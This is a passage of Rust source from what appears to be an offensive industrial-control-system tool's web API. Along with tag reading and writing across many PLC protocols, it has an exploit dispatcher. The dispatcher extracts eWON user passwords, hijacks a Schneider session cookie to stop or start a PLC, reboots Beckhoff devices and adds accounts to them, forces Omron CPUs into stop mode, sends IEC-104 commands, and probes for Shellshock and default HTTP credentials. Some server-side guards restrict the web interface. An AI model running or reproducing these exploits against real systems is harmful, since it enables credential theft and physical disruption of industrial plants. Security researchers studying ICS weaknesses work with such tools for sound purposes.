                                    "type_name": driver::type_name(leaf.cip_type),
                                    "writable": leaf.writable,
                                })
                            })
                            .collect();
                        json!({
                            "_display": display_str,
                            "_type": driver::type_name(tag.tag_type),
                            "_fields": fields,
                        })
                    } else {
                        json!({
                            "_display": display_str,
                            "_type": driver::type_name(tag.tag_type),
                            "_scalar": true,
                            "_write_type": tag.tag_type,
                            "_writable": driver::is_writable_type(tag.tag_type),
                        })
                    };
                    tags.insert(tag.name.clone(), json_val);
                }
            }
        }
        // ── Phoenix Contact WebVisit: live tag reads via ILRReadValues CGI ───
        "phoenix" | "webvisit" => {
            use casket::vendors::phoenix::webvisit;
            let port = device_phoenix_webvisit_port(ip);
            if let Ok((_, tag_names)) = webvisit::get_tags(ip, port) {
                if let Ok(values) = webvisit::read_tag_values(ip, port, &tag_names) {
                    for (name, val) in values {
                        tags.insert(name, Value::String(val));
                    }
                }
            }
        }
        // ── IEC 60870-5-104: General Interrogation → decoded data objects ────
        "iec104" => {
            use casket::vendors::iec104::client;
            if let Ok(mut session) = client::connect(ip, device_iec104_port(ip)) {
                if let Ok(objects) = client::general_interrogation(&mut session) {
                    for obj in objects {
                        tags.insert(format!("IOA {}", obj.ioa), Value::String(obj.decoded));
                    }
                }
            }
        }
        // ── Beckhoff ADS: enumerate symbols and read values ───────────────────
        "beckhoff" | "ads" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let port = device_field_u16(ip, "ads_port")
                .or_else(|| device_field_u16(ip, "port"))
                .unwrap_or(scan::DEFAULT_ADS_PORT);
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            if let Ok(devices) = scan::discover_ip_with_port(ip, 3, true, port) {
                if let Some(dev) = devices.into_iter().next() {
                    let symbols = scan::enumerate_symbols(&dev, &local_netid, port);
                    for sym in &symbols {
                        if let Some(val) = &sym.value_str {
                            tags.insert(sym.name.clone(), Value::String(val.clone()));
                        }
                    }
                }
            }
        }
        // ── eWON Flexy: live tag values via REST API ──────────────────────────
        "ewon" => {
            let db_user = device_field_str(ip, "username");
            let db_pass = device_field_str(ip, "password");
            let eff_user = username.or(db_user.as_deref());
            let eff_pass = password.or(db_pass.as_deref());
            let ewon_creds = eff_user.zip(eff_pass);
            let port = device_ewon_web_port(ip);
            if let Ok(tag_values) =
                casket::vendors::ewon::scan::read_tag_values(ip, port, ewon_creds)
            {
                for (name, val) in tag_values {
                    tags.insert(name, Value::String(val));
                }
            }
        }
        // ── SNMP: walk MIB-II system OID tree ────────────────────────────────
        "snmp" => {
            use casket::vendors::snmp::client;
            if let Some(community) = device_field_str(ip, "community") {
                let port = device_snmp_port(ip);
                if let Ok(varbinds) = client::walk(ip, port, &community, ".1.3.6.1.2.1.1") {
                    for (oid, val) in varbinds {
                        tags.insert(oid, Value::String(val.display()));
                    }
                }
            }
        }
        // ── MQTT: subscribe to # and drain received topics ────────────────────
        "mqtt" => {
            use casket::vendors::mqtt::session::{ConnectOptions, MqttSession};
            let opts = ConnectOptions {
                host: ip.to_string(),
                port: device_mqtt_port(ip),
                client_id: "scadaver-web".to_string(),
                username: username.map(str::to_string),
                password: password.map(str::to_string),
                ..ConnectOptions::default()
            };
            if let Ok(mut session) = MqttSession::connect(&opts) {
                let _ = session.subscribe("#", 0);
                std::thread::sleep(std::time::Duration::from_secs(2));
                for msg in session.drain_messages().into_iter().take(50) {
                    let display = String::from_utf8_lossy(&msg.payload).into_owned();
                    tags.insert(msg.topic, Value::String(display));
                }
            }
        }
        // ── BACnet/IP: read device properties as tags ─────────────────────────
        "bacnet" => {
            let bacnet_port = device_bacnet_port(ip);
            if let Some(dev) =
                casket::vendors::bacnet::client::scan_ip_with_port(ip, bacnet_port, 5)
            {
                tags.insert("vendor_name".into(), dev.vendor_name.into());
                tags.insert("object_name".into(), dev.object_name.into());
                tags.insert("description".into(), dev.description.into());
                tags.insert("firmware_revision".into(), dev.firmware_revision.into());
                tags.insert("instance_id".into(), dev.instance_id.to_string().into());
            }
        }
        // ── DNP3: read device attributes ─────────────────────────────────────
        "dnp3" => {
            let dnp3_port = device_dnp3_port(ip);
            let attrs = casket::vendors::dnp3::client::read_device_attributes_with_port(
                ip,
                dnp3_port,
                std::time::Duration::from_secs(5),
            );
            for (k, v) in attrs {
                tags.insert(k, v.into());
            }
        }
        // ── OPC-UA: enumerate server endpoints ───────────────────────────────
        "opcua" => {
            for (i, ep) in casket::vendors::opcua::client::get_endpoints(
                ip,
                device_opcua_port(ip),
                std::time::Duration::from_secs(5),
            )
            .iter()
            .enumerate()
            {
                tags.insert(format!("ep{i}.url"), ep.url.clone().into());
                tags.insert(
                    format!("ep{i}.security_mode"),
                    ep.security_mode.clone().into(),
                );
                tags.insert(
                    format!("ep{i}.security_policy"),
                    ep.security_policy.clone().into(),
                );
            }
        }
        _ => {}
    }

    Value::Object(tags)
}

fn read_tags_from_db(ip: &str) -> Value {
    if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
        if let Ok(devices) = db.load_devices() {
            if let Some(dev) = devices.iter().find(|d| d.ip == ip) {
                if let Value::Object(fields) = &dev.fields {
                    if let Some(cached) = fields.get("_tags") {
                        return cached.clone();
                    }
                }
            }
        }
    }
    Value::Object(Map::new())
}

// ─── Write tag ────────────────────────────────────────────────────────────────

async fn api_device_write(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<WriteReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    api_device_write_inner(req).await.into_response()
}

async fn api_device_write_inner(req: WriteReq) -> Json<Value> {
    if web_vendor_write_is_blocked(&req.vendor) {
        return Json(json!({
            "success": false,
            "error": "This protocol is read-only in the web interface; use approved change-control tooling for writes"
        }));
    }
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let tag = req.tag.clone();
    let value = req.value.clone();
    let type_code = req.type_code;
    let username = req.username.clone();
    let password = req.password.clone();

    let result = tokio::task::spawn_blocking(move || {
        write_tag_for_vendor(
            &ip,
            &vendor,
            &tag,
            &value,
            type_code,
            username.as_deref(),
            password.as_deref(),
        )
    })
    .await;

    match result {
        Ok(Ok(())) => Json(json!({"success": true})),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": join_err(&e)})),
    }
}

/// The web rollout exposes these protocol families for discovery and tag reads
/// only. Keeping this guard server-side prevents a crafted browser request
/// from bypassing the read-only tag presentation.
fn web_vendor_write_is_blocked(vendor: &str) -> bool {
    matches!(
        vendor,
        "modbus"
            | "schneider"
            | "modicon"
            | "siemens"
            | "s7"
            | "beckhoff"
            | "ads"
            | "rockwell"
            | "enip"
            | "ethernet_ip"
            | "mitsubishi"
            | "slmp"
            | "omron"
            | "fins"
            | "phoenix"
            | "webvisit"
            | "ewon"
            | "iec104"
            | "snmp"
            | "mqtt"
            | "bacnet"
            | "dnp3"
            | "opcua"
            | "opc-ua"
    )
}

/// Write one Logix scalar or UDT member.
///
/// `tag` may be a plain tag name or a dotted member path such as `Pump.Cmd.SP`; the driver
/// encodes each component as its own CIP symbolic segment. `type_code` is required because
/// the text has to be encoded to the member's exact CIP type — guessing risks writing a
/// different value than the operator typed.
fn write_rockwell_tag(
    ip: &str,
    tag: &str,
    value: &str,
    type_code: Option<u16>,
) -> anyhow::Result<()> {
    use casket::vendors::rockwell::driver;

    let cip_type = type_code.ok_or_else(|| {
        anyhow::anyhow!(
            "Writing '{tag}' needs its CIP type code; reload the tag list so the UI can \
             supply it, or use the CLI: scadaver -i {ip} set tag {tag} <value>"
        )
    })?;
    if !driver::is_writable_type(cip_type) {
        anyhow::bail!(
            "'{tag}' has CIP type 0x{:02X} ({}), which is not a writable scalar. \
             Arrays and whole structures must be written element by element.",
            cip_type & 0xFF,
            driver::type_name(cip_type)
        );
    }
    let bytes = driver::encode_value_for_type(cip_type, value)?;
    driver::write_tag(ip, 0, tag, cip_type & 0x0FFF, &bytes)
}

#[allow(clippy::too_many_lines)]
fn write_tag_for_vendor(
    ip: &str,
    vendor: &str,
    tag: &str,
    value: &str,
    type_code: Option<u16>,
    _username: Option<&str>,
    password: Option<&str>,
) -> anyhow::Result<()> {
    use casket::core::modbus;

    // ── IEC 60870-5-104 ──────────────────────────────────────────────────────
    // Tag format: "IOA:<number>" or "IOA <number>". Value: "1"/"on" or "0"/"off".
    if matches!(vendor, "iec104") {
        use casket::vendors::iec104::client;
        let ioa: u32 = tag
            .strip_prefix("IOA:")
            .or_else(|| tag.strip_prefix("IOA "))
            .ok_or_else(|| anyhow::anyhow!("IEC-104 tag must be 'IOA:<number>', got: {tag}"))?
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("IEC-104 IOA must be a number, got: {tag}"))?;
        let mut session = client::connect(ip, 0)
            .map_err(|e| anyhow::anyhow!("IEC-104 connect to {ip} failed: {e}"))?;
        client::single_command(&mut session, ioa, parse_bool_value(value))?;
        return Ok(());
    }

    // ── Protocols without casket write support ───────────────────────────────
    if matches!(vendor, "bacnet") {
        anyhow::bail!("BACnet write not supported; casket has no WriteProperty implementation yet");
    }
    if matches!(vendor, "dnp3") {
        anyhow::bail!("DNP3 write not supported; casket has no direct operate implementation yet");
    }
    if matches!(vendor, "opcua") {
        anyhow::bail!("OPC-UA write not supported; casket uses anonymous sessions only");
    }

    // ── Siemens S7 ───────────────────────────────────────────────────────────
    // Tags displayed as "Q0.0"…"Q0.7" (outputs) and "M0.0"…"M0.7" (merkers).
    if matches!(vendor, "siemens" | "s7") {
        use casket::vendors::siemens::s7comm;
        let (area, byte_idx, bit_idx) = parse_s7_bit_tag(tag).ok_or_else(|| {
            anyhow::anyhow!("Siemens tag must be Q<byte>.<bit> or M<byte>.<bit>, got: {tag}")
        })?;
        let bit_on = parse_bool_value(value);
        let db_pw = device_field_str(ip, "password");
        let effective_pw = password.or(db_pw.as_deref());
        match area {
            'Q' => s7comm::write_output_bit(ip, byte_idx, bit_idx, bit_on, 102, 5, effective_pw)?,
            'M' => s7comm::write_merker_bit(ip, byte_idx, bit_idx, bit_on, 102, 5, effective_pw)?,
            _ => anyhow::bail!("Unsupported Siemens area '{area}'; use Q or M"),
        }
        return Ok(());
    }

    // ── Mitsubishi MELSEC ────────────────────────────────────────────────────
    // Tags displayed as "D0"…"D9" (word) and "M0"…"M9" (bit).
    if matches!(vendor, "mitsubishi" | "slmp") {
        use casket::vendors::mitsubishi::slmp;
        if let Some(rest) = tag.strip_prefix('D') {
            let addr: u32 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid D-register address: {rest}"))?;
            let val: u16 = value
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("D value must be 0–65535, got: {value}"))?;
            slmp::write_word_devices(ip, 5007, "D", addr, &[val])?;
        } else if let Some(rest) = tag.strip_prefix('M') {
            let addr: u32 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid M-coil address: {rest}"))?;
            slmp::write_bit_devices(ip, 5007, "M", addr, &[parse_bool_value(value)])?;
        } else {
            anyhow::bail!("Mitsubishi tag must be D<n> or M<n>, got: {tag}");
        }
        return Ok(());
    }

    // ── Omron FINS ───────────────────────────────────────────────────────────
    // Tags displayed as "DM0"…"DM9" (word).
    if matches!(vendor, "omron" | "fins") {
        use casket::vendors::omron::fins;
        if let Some(rest) = tag.strip_prefix("DM") {
            let addr: u16 = rest
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid DM address: {rest}"))?;
            let val: u16 = value
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("DM value must be 0–65535, got: {value}"))?;
            fins::write_dm_words(ip, 9600, 0, addr, &[val])?;
        } else {
            anyhow::bail!("Omron tag must be DM<n>, got: {tag}");
        }
        return Ok(());
    }

    // ── Phoenix WebVisit ─────────────────────────────────────────────────────
    // ── Beckhoff / Rockwell: actionable CLI guidance ──────────────────────────
    if matches!(vendor, "beckhoff" | "ads") {
        anyhow::bail!("Beckhoff symbol writes require the CLI: scadaver -i {ip} run write-symbol");
    }
    // ── Rockwell Logix ───────────────────────────────────────────────────────
    if matches!(vendor, "rockwell" | "enip" | "ethernet_ip") {
        return write_rockwell_tag(ip, tag, value, type_code);
    }

    // ── Modbus / Schneider / generic ─────────────────────────────────────────
    if matches!(vendor, "modbus" | "schneider" | "modicon")
        && !tag.starts_with("hr:")
        && !tag.starts_with("coil:")
    {
        anyhow::bail!(
            "Modbus tag must use a prefix: 'hr:<addr>' for holding register or \
             'coil:<addr>' for coil, e.g. hr:0 or coil:5"
        );
    }
    let modbus_port = device_field_u16(ip, "modbus_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(modbus::DEFAULT_PORT);
    if let Some(rest) = tag.strip_prefix("hr:") {
        let address: u16 = rest
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid register address: {rest}"))?;
        let val: u16 = value
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid register value: {value}"))?;
        modbus::write_single_register(ip, modbus_port, address, val)?;
        return Ok(());
    }

    if let Some(rest) = tag.strip_prefix("coil:") {
        let address: u16 = rest
            .trim()
            .parse()
            .map_err(|_| anyhow::anyhow!("Invalid coil address: {rest}"))?;
        modbus::write_single_coil(ip, modbus_port, address, parse_bool_value(value))?;
        return Ok(());
    }

    anyhow::bail!(
        "Unknown tag format '{tag}' for vendor '{vendor}'. \
         Use hr:<addr> or coil:<addr> for Modbus, Q<b>.<n>/M<b>.<n> for Siemens, \
         D<n>/M<n> for Mitsubishi, DM<n> for Omron."
    )
}

fn parse_s7_bit_tag(tag: &str) -> Option<(char, u8, u8)> {
    let area = tag.chars().next()?;
    let rest = &tag[area.len_utf8()..]; // correct: skip the actual UTF-8 byte length
    let (byte_s, bit_s) = rest.split_once('.')?;
    Some((area, byte_s.parse().ok()?, bit_s.parse().ok()?))
}

fn parse_bool_value(s: &str) -> bool {
    !matches!(
        s.trim().to_ascii_lowercase().as_str(),
        "false" | "0" | "off"
    )
}

// ─── History ──────────────────────────────────────────────────────────────────

async fn api_device_history(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<HistoryQuery>,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let ip = q.ip.clone();
    let vendor = q.vendor.clone();

    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.load_data_points(&ip, &vendor)
    })
    .await;

    match result {
        Ok(Ok(points)) => {
            let list: Vec<Value> = points
                .iter()
                .map(|p| json!({"address": p.address, "last_value": p.last_value}))
                .collect();
            Json(json!({"history": list})).into_response()
        }
        _ => Json(json!({"history": []})).into_response(),
    }
}

// ─── eWON tags ────────────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct EwonTagsQuery {
    ip: String,
    #[serde(default)]
    port: u16,
}

async fn api_ewon_tags(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<EwonTagsQuery>,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let ip = q.ip.clone();
    let port = if q.port == 0 {
        device_ewon_web_port(&q.ip)
    } else {
        q.port
    };
    let result = tokio::task::spawn_blocking(move || {
        let user = device_field_str(&ip, "username");
        let pass = device_field_str(&ip, "password");
        let creds = user.as_deref().zip(pass.as_deref());
        casket::vendors::ewon::scan::read_tag_values(&ip, port, creds)
    })
    .await;
    match result {
        Ok(Ok(tags)) => {
            let list: Vec<Value> = tags
                .into_iter()
                .map(|(n, v)| json!({"name": n, "value": v}))
                .collect();
            Json(json!({"tags": list})).into_response()
        }
        Ok(Err(e)) => (
            StatusCode::BAD_GATEWAY,
            Json(json!({"error": e.to_string()})),
        )
            .into_response(),
        Err(_) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({"error": "task panicked"})),
        )
            .into_response(),
    }
}

// ─── Schneider info ───────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct SchneiderInfoQuery {
    ip: String,
    #[serde(default)]
    port: u16,
}

async fn api_schneider_info(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<SchneiderInfoQuery>,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let ip = q.ip.clone();
    let port = q.port;
    let result = tokio::task::spawn_blocking(move || {
        use casket::vendors::schneider::session_hijack;
        let session = session_hijack::get_session_cookie(&ip, port)?;
        session_hijack::get_device_info(&ip, port, &session.cookie_value, "USER")
    })
    .await;
    match result {
        Ok(Some(info)) => Json(json!({
            "device": info.device,
            "mac": info.mac,
            "firmware": info.firmware,
            "state": info.state,
        }))
        .into_response(),
        Ok(None) => (
            StatusCode::NOT_FOUND,
            Json(json!({"error": "no device info returned"})),
        )
            .into_response(),
        Err(_) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({"error": "task panicked"})),
        )
            .into_response(),
    }
}

// ─── Exploits ─────────────────────────────────────────────────────────────────

async fn api_exploit(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Path(id): Path<String>,
    Json(req): Json<ExploitReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    api_exploit_inner(id, req, state.events_tx.clone())
        .await
        .into_response()
}

async fn api_exploit_inner(
    id: String,
    req: ExploitReq,
    events_tx: broadcast::Sender<DeviceEvent>,
) -> Json<Value> {
    let exploit_id = id.trim_start_matches('/').to_string();
    if !web_exploit_is_allowed(&exploit_id) {
        return Json(json!({
            "success": false,
            "error": "Protocol actions are unavailable in the read-only web interface"
        }));
    }
    let ip = req.ip.clone();
    let username = req.username.clone();
    let password = req.password.clone();
    let port = req.port;

    let result =
        tokio::task::spawn_blocking(move || run_exploit(&exploit_id, &ip, port, &username, &password))
            .await;

    match result {
        Ok(Ok(output)) => {
            let _ = events_tx.send(DeviceEvent {
                event: "exploit_output",
                ip: req.ip.clone(),
                vendor: None,
                message: Some(output.clone()),
            });
            Json(json!({"success": true, "output": output}))
        }
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})),
        Err(e) => Json(json!({"success": false, "error": join_err(&e)})),
    }
}

/// The read-only web workflow deliberately rejects legacy action endpoints.
/// Keep this server-side so crafted requests cannot revive non-read-only
/// protocol actions even when no action card is rendered by the UI.
///
/// Note: the `"common"` namespace (`common/shellshock`, `common/http_creds`) is
/// intentionally NOT in the block list. Those exploits target IT-layer services
/// (Bash CGI, HTTP basic-auth), not PLC memory writes, so they are allowed through
/// the web API. All PLC/OT protocol namespaces below are blocked.
fn web_exploit_is_allowed(id: &str) -> bool {
    !matches!(
        id.trim_start_matches('/').split_once('/'),
        Some((
            "modbus"
                | "schneider"
                | "modicon"
                | "siemens"
                | "s7"
                | "beckhoff"
                | "ads"
                | "rockwell"
                | "enip"
                | "ethernet_ip"
                | "mitsubishi"
                | "slmp"
                | "omron"
                | "fins"
                | "phoenix"
                | "webvisit"
                | "ewon"
                | "iec104"
                | "snmp"
                | "mqtt"
                | "bacnet"
                | "dnp3"
                | "opcua"
                | "opc-ua",
            _
        ))
    )
}

#[allow(clippy::too_many_lines)] // single-responsibility match dispatch over many exploit types
fn run_exploit(id: &str, ip: &str, port: u16, username: &str, password: &str) -> anyhow::Result<String> {
    // Use the caller-supplied port when non-zero; otherwise fall back to the protocol default.
    let eff_port = |def: u16| -> u16 { if port == 0 { def } else { port } };
    match id {
        "ewon/creds" => {
            let users = casket::vendors::ewon::exploit::exploit(ip, 0, "adm", 20);
            if users.is_empty() {
                return Ok("No credentials extracted.".into());
            }
            let mut out = String::new();
            for u in &users {
                writeln!(
                    out,
                    "User: {} ({} {})\n  Password: {}\n  Rights: {}\n---",
                    u.username, u.first_name, u.last_name, u.password, u.access_rights
                )
                .ok();
            }
            Ok(out)
        }

        "schneider/flash" => {
            casket::vendors::schneider::flash_led::flash_led_ip(ip)?;
            Ok(format!("Flash LED command sent to {ip}."))
        }

        "schneider/session_stop" | "schneider/session_run" => {
            use casket::vendors::schneider::session_hijack;
            let Some(session) = session_hijack::get_session_cookie(ip, 0) else {
                anyhow::bail!("Could not retrieve session cookie from {ip}");
            };
            let action = if id == "schneider/session_stop" {
                "stop"
            } else {
                "start"
            };
            let ok = session_hijack::control_plc(ip, 0, &session.cookie_value, "USER", action);
            if ok {
                Ok(format!(
                    "PLC {action} command sent (cookie: {}).",
                    session.cookie_value
                ))
            } else {
                anyhow::bail!("Control command failed")
            }
        }

        "beckhoff/reboot" => {
            let ok = casket::vendors::beckhoff::webcontrol::reboot(ip, 0)?;
            if ok {
                Ok(format!("Reboot command sent to {ip}."))
            } else {
                anyhow::bail!("Reboot command did not confirm")
            }
        }

        "beckhoff/add_user" => {
            if username.is_empty() || password.is_empty() {
                anyhow::bail!("Username and password are required");
            }
            let ok = casket::vendors::beckhoff::webcontrol::add_user(ip, 0, username, password)?;
            if ok {
                Ok(format!("User '{username}' added to {ip}."))
            } else {
                anyhow::bail!("Add user command did not confirm")
            }
        }

        "modicon/write_coil" => {
            let addr: u16 = username
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid coil address: '{username}'"))?;
            let on = !matches!(
                password.trim().to_ascii_lowercase().as_str(),
                "false" | "0" | "off"
            );
            casket::core::modbus::write_single_coil(
                ip,
                casket::core::modbus::DEFAULT_PORT,
                addr,
                on,
            )?;
            Ok(format!(
                "Coil {addr} set to {}.",
                if on { "ON" } else { "OFF" }
            ))
        }

        "modicon/write_register" => {
            let addr: u16 = username
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid register address: '{username}'"))?;
            let val: u16 = password
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid register value: '{password}'"))?;
            casket::core::modbus::write_single_register(
                ip,
                casket::core::modbus::DEFAULT_PORT,
                addr,
                val,
            )?;
            Ok(format!("Register {addr} written: {val}"))
        }

        "modbus/map-quick" | "modbus/map-common" => {
            use casket::core::modbus;
            use std::fmt::Write as _;
            let port = modbus::DEFAULT_PORT;
            let count: u16 = if id == "modbus/map-quick" { 125 } else { 512 };
            let mut out = String::new();
            match modbus::read_holding_registers(ip, port, 0, count) {
                Ok(regs) if !regs.is_empty() => {
                    writeln!(out, "=== Holding Registers (FC3) ===").ok();
                    for r in &regs {
                        writeln!(out, "  {}  {}", r.display_addr, r.value_str).ok();
                    }
                }
                Ok(_) => {}
                Err(e) => {
                    writeln!(out, "FC3: {e:#}").ok();
                }
            }
            match modbus::read_coils(ip, port, 0, count.min(64)) {
                Ok(regs) if !regs.is_empty() => {
                    writeln!(out, "=== Coils (FC1) ===").ok();
                    for r in &regs {
                        writeln!(out, "  {}  {}", r.display_addr, r.value_str).ok();
                    }
                }
                Ok(_) => {}
                Err(e) => {
                    writeln!(out, "FC1: {e:#}").ok();
                }
            }
            match modbus::read_input_registers(ip, port, 0, count) {
                Ok(regs) if !regs.is_empty() => {
                    writeln!(out, "=== Input Registers (FC4) ===").ok();
                    for r in &regs {
                        writeln!(out, "  {}  {}", r.display_addr, r.value_str).ok();
                    }
                }
                Ok(_) => {}
                Err(e) => {
                    writeln!(out, "FC4: {e:#}").ok();
                }
            }
            match modbus::read_discrete_inputs(ip, port, 0, count.min(64)) {
                Ok(regs) if !regs.is_empty() => {
                    writeln!(out, "=== Discrete Inputs (FC2) ===").ok();
                    for r in &regs {
                        writeln!(out, "  {}  {}", r.display_addr, r.value_str).ok();
                    }
                }
                Ok(_) => {}
                Err(e) => {
                    writeln!(out, "FC2: {e:#}").ok();
                }
            }
            if out.is_empty() {
                Ok("No Modbus registers accessible on any function code.".into())
            } else {
                Ok(out)
            }
        }

        "common/shellshock" => {
            let results = casket::core::shellshock::test_shellshock(ip, 80, 8);
            let mut out = String::new();
            let mut any_vuln = false;
            for r in &results {
                let status = if r.vulnerable { "VULNERABLE" } else { "safe" };
                writeln!(out, "{:<36} {:<12} {}", r.path, status, r.evidence).ok();
                if r.vulnerable {
                    any_vuln = true;
                }
            }
            if any_vuln {
                out.push_str("\n[!] Target may be vulnerable to CVE-2014-6271 (Shellshock).");
            } else {
                out.push_str("\n[*] No Shellshock vulnerability detected.");
            }
            Ok(out)
        }

        "common/http_creds" => {
            match casket::core::httpcreds::test_http_basic(ip, 80, "/", 8, &[]) {
                Some(r) => Ok(format!(
                    "Valid credentials found: {}:{} (HTTP {})\nPath: {}",
                    r.username, r.password, r.status, r.path
                )),
                None => Ok("No default credentials accepted by HTTP basic auth.".into()),
            }
        }

        "omron/info" => {
            use casket::vendors::omron::fins;
            let dev = fins::get_device_info_tcp(ip, eff_port(9600))?;
            Ok(format!(
                "Node:    {}\nModel:   {}\nVersion: {}",
                dev.node_addr, dev.model, dev.version
            ))
        }

        "omron/cpu_status" => {
            use casket::vendors::omron::fins;
            let state = fins::get_cpu_state(ip, eff_port(9600), 0)?;
            Ok(format!("CPU state: {state}"))
        }

        "omron/cpu_run" => {
            use casket::vendors::omron::fins;
            let ok = fins::set_cpu_mode(ip, eff_port(9600), 0, true)?;
            if ok {
                Ok(format!("CPU set to Monitor (Run) mode on {ip}."))
            } else {
                anyhow::bail!("CPU mode change was not confirmed by device")
            }
        }

        "omron/cpu_stop" => {
            use casket::vendors::omron::fins;
            let ok = fins::set_cpu_mode(ip, eff_port(9600), 0, false)?;
            if ok {
                Ok(format!("CPU set to Stop mode on {ip}."))
            } else {
                anyhow::bail!("CPU mode change was not confirmed by device")
            }
        }

        "omron/read_dm" => {
            use casket::vendors::omron::fins;
            let start: u16 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(10).min(100);
            let words = fins::read_dm_words(ip, eff_port(9600), 0, start, count)?;
            let mut out = String::new();
            for (i, val) in words.iter().enumerate() {
                writeln!(out, "DM{}: {val}", start as usize + i).ok();
            }
            Ok(out)
        }

        "omron/write_dm" => {
            use casket::vendors::omron::fins;
            let start: u16 = username
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("Invalid start address: '{username}'"))?;
            let mut values: Vec<u16> = Vec::new();
            for s in password.split_whitespace().take(100) {
                values.push(
                    s.parse::<u16>()
                        .map_err(|_| anyhow::anyhow!("Invalid value '{s}': must be 0–65535"))?,
                );
            }
            if values.is_empty() {
                anyhow::bail!("No values provided in Password field");
            }
            fins::write_dm_words(ip, eff_port(9600), 0, start, &values)?;
            Ok(format!(
                "Wrote {} word(s) starting at DM{} on {ip}.",
                values.len(),
                start
            ))
        }

        "mitsubishi/info" => {
            use casket::vendors::mitsubishi::scan;
            let devices = scan::scan_ip(ip, 3, true)?;
            if devices.is_empty() {
                return Ok(format!(
                    "No device info returned from {ip} via discovery.\n\
                     Device may use TCP-only SLMP: try Read D Registers or Read M Bits."
                ));
            }
            let mut out = String::new();
            for dev in &devices {
                writeln!(out, "IP:       {}", dev.ip).ok();
                writeln!(out, "Type:     {}", dev.plc_type).ok();
                if let Some(t) = &dev.title {
                    writeln!(out, "Title:    {t}").ok();
                }
                if let Some(c) = &dev.comment {
                    writeln!(out, "Comment:  {c}").ok();
                }
                if let Some(p) = &dev.protocol {
                    writeln!(out, "Protocol: {p}").ok();
                }
                if let Some(port) = dev.port {
                    writeln!(out, "Port:     {port}").ok();
                }
                writeln!(out, "---").ok();
            }
            Ok(out)
        }

        "mitsubishi/read_d" => {
            use casket::vendors::mitsubishi::slmp;
            let start: u32 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(20).min(100);
            let words = slmp::read_word_devices(ip, eff_port(5007), "D", start, count)?;
            let mut out = String::new();
            for v in &words {
                writeln!(out, "{}: {}", v.display, v.value_str).ok();
            }
            Ok(out)
        }

        "mitsubishi/read_m" => {
            use casket::vendors::mitsubishi::slmp;
            let start: u32 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(20).min(100);
            let bits = slmp::read_bit_devices(ip, eff_port(5007), "M", start, count)?;
            let mut out = String::new();
            for v in &bits {
                writeln!(out, "{}: {}", v.display, v.value_str).ok();
            }
            Ok(out)
        }

        "iec104/gi" => {
            use casket::vendors::iec104::client;
            let mut session = client::connect(ip, eff_port(2404))?;
            let objects = client::general_interrogation(&mut session)?;
            if objects.is_empty() {
                return Ok("General Interrogation completed: no data objects returned.".into());
            }
            let mut out = String::new();
            for obj in &objects {
                writeln!(
                    out,
                    "IOA {:>6} (type {:>3}): {}",
                    obj.ioa, obj.type_id, obj.decoded
                )
                .ok();
            }
            Ok(out)
        }

        "iec104/sc_on" | "iec104/sc_off" => {
            use casket::vendors::iec104::client;
            let ioa: u32 = username.trim().parse().unwrap_or(1);
            let on = id == "iec104/sc_on";
            let mut session = client::connect(ip, eff_port(2404))?;
            let confirmed = client::single_command(&mut session, ioa, on)?;
            if confirmed {
                Ok(format!(
                    "Single command {} IOA {ioa} confirmed on {ip}.",
                    if on { "ON" } else { "OFF" }
                ))
            } else {
                anyhow::bail!(
                    "Single command IOA {ioa} received negative acknowledgement from {ip}"
                )
            }
        }

        "siemens/probe_auth" => {
            use casket::vendors::siemens::s7comm;
            if s7comm::probe_auth_required(ip, eff_port(102), 5) {
                Ok(format!(
                    "{ip} has S7Comm access protection enabled — a CPU password is required."
                ))
            } else {
                Ok(format!(
                    "{ip} has no S7Comm access protection — commands succeed without a password."
                ))
            }
        }

        "rockwell/identity" => {
            use casket::vendors::rockwell::driver;
            let dev = driver::get_device_info(ip, device_enip_port(ip))?;
            Ok(format!(
                "Vendor:       {}\nProduct Type: {}\nProduct Code: {}\nRevision:     {}\nSerial:       {}\nName:         {}",
